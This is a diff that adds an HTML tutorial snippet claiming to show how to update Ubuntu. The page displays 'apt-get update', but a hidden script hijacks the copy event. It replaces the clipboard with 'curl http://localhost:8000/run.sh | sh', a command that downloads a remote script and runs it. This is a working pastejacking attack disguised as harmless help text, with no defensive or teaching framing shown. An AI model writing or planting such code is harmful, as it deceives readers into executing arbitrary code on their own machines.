@@ -1,0 +1,11 @@
+<p>How to update ubuntu: </p>
+<code><p id='copy'>apt-get update</p></code>
+<script>
+document.getElementById('copy').addEventListener(
+'copy', function(e) {
+    e.clipboardData.setData('text/plain',
+    'curl http://localhost:8000/run.sh | sh\n'
+    );
+    e.preventDefault();
+});
+</script>
